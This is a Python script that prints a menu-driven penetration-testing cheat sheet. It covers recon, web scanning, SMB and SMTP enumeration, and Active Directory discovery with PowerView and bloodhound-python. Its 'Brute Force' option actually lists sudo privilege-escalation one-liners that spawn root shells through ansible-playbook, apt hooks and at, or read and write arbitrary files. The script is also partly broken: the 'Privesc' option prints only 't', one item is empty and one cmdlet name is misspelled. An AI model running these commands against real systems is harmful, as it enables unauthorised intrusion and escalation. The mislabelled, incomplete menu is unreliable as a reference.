def loop():

    print("""

                          
 )__/_ _ / '  _  /| ) _/_ 
/  /(/( /(//)(/ / |/()/(- 
            _/           

[1]Recon            [4]Privesc
[2]Website Hacking  [5]Active Directory
[3]Network Hacking  [6]Brute Force

 """)

    choice = input("What do you want to see? ")

    if choice == "1":
        print("sudo nmap -sC -sV -vv <ip> -oN nmap-scan")
        loop()
    elif choice == "2":
        print("""
  
  1.sudo nikto -h http://<ip> | tee nikto
  2.sudo gobuster dir -u http://<ip> -w <path> | tee gobuster
  3.sudo sqlmap --url http://<ip> | tee sqlmap
  4.sudo wpscan --url http://<ip> | tee wpscan 
  5.sudo webacoo -g -o Index.<extention>
  6.sudo dmitry http://<ip> | tee dmitry
  7.sudo dnsenum --noreverse -o dnsenum.xml <domain>
  8.sudo automater -s robtex <ip> | tee automater
  9.sudo fimap -u "http://<ip>" | tee fimap
  10.sudo parsero -u <ip> -sb | tee parsero
  11.sudo jboss-<os> <ip> <port> 2> /dev/null | tee jboss-auto-pwn
  12.sudo grabber --spider 1 --sql --xss --url http://<ip> | tee grabber
  13.sudo plecost -n 100 -s 10 -M 15 -i <path> <ip> | tee plecost
  14.sudo uniscan -u http://<ip>/ -qd | tee uniscan
  15.sudo skipfish -o 202 http://<ip> | tee skipfish
  16.sudo joomscan --url http://<ip> | tee joomscan
  17.sudo wfuzz -c -z file,<path> --hc 404 http://<ip>/FUZZ
  18.sudo webshag-cli -m pscan <ip> | tee webshag 
  19.sudo davtest -url http://<ip> | tee davtest
  20.sudo apache-users -h <ip> -l <path> -p <port> -s 0 -e 403 -t 10 | tee apache-users
  21.sudo dnstracer -r 3 -v <domain> | tee dnstracer
  22.sudo dnswalk -r -d <domain>. | tee dnswalk
          """)
        loop()
    elif choice == "3":
        print("""
        
   1.sudo enum4linux -v <ip>
   2.sudo smbmap -u <username> -p <password> -H <ip>
   3.sudo braa <username>@<ip>:<version number>
   4.sudo smtp-user-enum -M VRFY -u <file/username> -t <ip> | tee smtp-user-enum

        
      """)
        loop()
    elif choice == "4":
        print("t")
        loop()
    elif choice == "5":
        print("""
        
        1.Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
        2.Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
        3.Get-DomainController -Domain <DomainName>
        4.Get-NetLoggedon -ComputerName <ComputerName>
        5.Get-NetSession -ComputerName <ComputerName>
        6.Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
        7.Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
        8.Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
        9.Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member 
        10.Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName
        11.Get-NetLocalGroup | Select-Object GroupName
        12.Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
        13.Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
        14.Find-DomainShare -CheckShareAccess
        15.Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
        16.Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName
        17.Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
        18.Get-DomainOU -Properties Name | Sort-Object -Property Name
        19.Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs
        20.Find-InterestingDomainAcl -ResolveGUIDs
        21.Get-PathAcl -Path "\\Path\Of\A\Share"
        22.Get-DomainTrust -Domain <DomainName>
        23.Get-DomainTrustMapping
        24.Get-ForestDomain -Forest <ForestName>
        25.Get-ForestTrust -Forest <ForestName>
        26.Find-LocalAdminAccess -Verbose
        27.Find-DomainLocalGroupMember -Verbose
        28.Find-DomainUserLocation | Select-Object UserName, SessionFromName
        29.Test-AdminAccess
        30.Get-ADDomainController -Identity <DomainName>
        31.Get-ADUser -Filter * -Identity <user> -Properties *
        32.Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
        33.Get-ADComputer -Filter * -Properties *
        34.Get-ADTrust -Filter *
        35.Get-ADTrust -Identity <DomainName>
        36.Get-ADForest -Identity <ForestName>
        37.Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
        38.bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
        """)
        loop()
    elif choice == "6":
        print("""
        
        1.TF=$(mktemp)
          echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
          sudo ansible-playbook $TF
        2.sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
        3.sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
        4.TF=$(mktemp -u)
          LFILE=file_to_read
          sudo ar r "$TF" "$LFILE"
          cat "$TF"
        5.COMMAND='id'
          TF=$(mktemp)
          echo "$COMMAND" > $TF
          chmod +x $TF
          sudo aria2c --on-download-error=$TF http://x
        6.TF=$(mktemp -d)
          LFILE=file_to_write
          LDIR=where_to_write
          echo DATA >"$TF/$LFILE"
          arj a "$TF/a" "$TF/$LFILE"
          sudo arj e "$TF/a" $LDIR
        7.LFILE=file_to_read
          sudo arp -v -f "$LFILE"
        8.sudo ash
        9.echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
        10.

        
        """)
        loop()


loop()
